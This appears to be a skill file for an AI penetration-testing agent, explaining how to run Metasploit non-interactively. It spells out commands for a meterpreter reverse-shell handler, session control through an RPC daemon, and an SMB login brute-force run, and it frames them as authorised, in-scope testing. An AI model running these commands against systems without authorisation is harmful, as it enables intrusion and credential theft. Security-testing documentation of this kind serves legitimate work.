---
name: tools-metasploit
description: >
  Drive Metasploit (msfconsole/msfrpcd) for the exploitation phase without hanging the toolchain —
  one-shot -x invocations, RPC daemon mode for persistent sessions, batch auxiliary runs. Load when a
  confirmed vuln maps to a public MSF module, you need exploit/multi/handler for a reverse shell, or
  meterpreter sessions must survive across steps. Signals: msfconsole, msf, meterpreter, LHOST/LPORT,
  "module for this CVE", exploit/multi/handler, session opened.
domain: tools
type: technique
stability: learning
modes: [pentest, bugbounty]
severity: high
mitre: [T1190, T1059]
tools: [metasploit, msfconsole, msfrpcd, meterpreter, metasploitmcp]
schema_version: 1
---

# Metasploit without the hang

## When it applies
You have a confirmed in-scope weakness (`tradecraft-scope-roe` first) that maps to a Metasploit
module, or you need a `exploit/multi/handler` listener for a reverse shell (`payloads-reverse-shells`).
Metasploit is the right tool when a reliable public module exists; for novel bugs write a PoC
instead (`exploit-poc-development`). Driving MSF from scripts or an agent is where most people get
burned — this skill is the correct invocation discipline.

## Why it works
`msfconsole` is an interactive REPL: launched bare it waits for stdin forever, and each new console
is a separate process that cannot see another console's sessions. Non-interactive use therefore
means either (a) cramming the whole job into one `-x` string that ends in `exit`, or (b) keeping
state in a long-lived `msfrpcd` daemon that short-lived clients connect to.

## Method
1. **Pattern A — one-shot call (covers ~80% of cases).** Everything in a single `-x`, always ending
   with `;exit`:
   ```bash
   msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST <callback_ip>; set LPORT <port>; exploit; sleep 20; sessions -l; exit"
   ```
   `-q` suppresses the banner/verbosity; `sleep 20` gives the reverse shell time to call back;
   `sessions -l` runs *in the same process* so you actually see the session. Run with a generous
   timeout (120s+) and wait for real completion.
2. **Pattern B — RPC daemon (multi-step work with persistent sessions).** Check the port first,
   start the daemon in the background, then connect short-lived clients:
   ```bash
   netstat -tulnp | grep 55553                 # MUST verify the port is free first
   msfrpcd -P pass -U user -a 127.0.0.1 -p 55553 &   # background; long-lived
   msfconsole -q -x "connect 127.0.0.1:55553 user pass; use exploit/...; exploit; exit"
   msfconsole -q -x "connect 127.0.0.1:55553 user pass; sessions -l; sessions -i 1 -c 'whoami'; exit"
   ```
   Sessions live in the daemon, so later clients see them. `pkill -f msfrpcd` when done.
3. **Pattern C — batch auxiliary/scanner runs (no session needed).**
   ```bash
   msfconsole -q -x "use auxiliary/scanner/smb/smb_login; set RHOSTS <target>; set USER_FILE users.txt; set PASS_FILE passes.txt; run; exit"
   ```
   Use `run` for auxiliary modules (not `exploit`); all output arrives on stdout at exit.
4. **Listener discipline for callbacks.** LPORT must be inside the range the engagement/platform
   allocated to you; find your public IP with `curl -s https://api.ipify.org` if unknown, and verify
   reachability from outside with `nc -zv <callback_ip> <port>` before blaming the payload.
5. **Minimize output for logs/LLM context:** `-q`, `set ConsoleLogging false`, `set LogLevel 0`,
   prefer `sessions -l` over `-v`, and post-filter:
   `... | grep -E "session|opened|fail"`.
6. **MCP option:** Kali ships `metasploitmcp` (`apt install metasploitmcp`,
   `metasploitmcp --transport stdio`) exposing module/payload/session operations as MCP tools —
   see `tools-mcp-bridges`. The same invocation rules apply underneath.

## Gotchas
- **Bare `msfconsole` hangs forever** waiting for input — never invoke without `-x "..."`.
- **Missing `;exit`** at the end of `-x` = orphaned ruby process that never returns.
- **Splitting work across consoles** — a new console can't see a previous console's sessions; merge
  into one `-x` or switch to Pattern B.
- **Redundant handler** — `exploit` already starts a handler for the payload; adding a separate
  `exploit/multi/handler` in the same run just double-binds the port.
- **Bind failures are silent-ish** — if LPORT is taken the exploit errors but the console has
  already exited; `netstat -tulnp | grep :<port>` *before* every listener.
- **Diagnostics when anything misbehaves:** `ps aux | grep -E "msfconsole|msfrpcd|ruby"` for
  orphans, `netstat -tulnp | grep -E ":4444|:55553"` for stray listeners, then `pkill -f msfconsole`
  / `pkill -f msfrpcd` to clean up. MSF is all ruby — orphaned processes accumulate fast.
- **Meterpreter is the loudest C2** — heavily signatured; fine for labs, expect detections against
  defended targets (see `defense-*` for what blue teams look for).

## Verify success
`sessions -l` (in the same process, or against the same msfrpcd) shows an open session, and
`sessions -i <id> -c 'id'` returns the target context you expected. No orphaned ruby processes or
bound listeners remain after cleanup.

## References
Metasploit Framework docs; Rapid7 module DB; Metasploit Unleashed (free course);
GH05TCREW/MetasploitMCP. Handler payloads: `payloads-reverse-shells`.

---
_Portions adapted from [reverse-skill](https://github.com/zhaoxuya520/reverse-skill) by zhaoxuya520, MIT License._
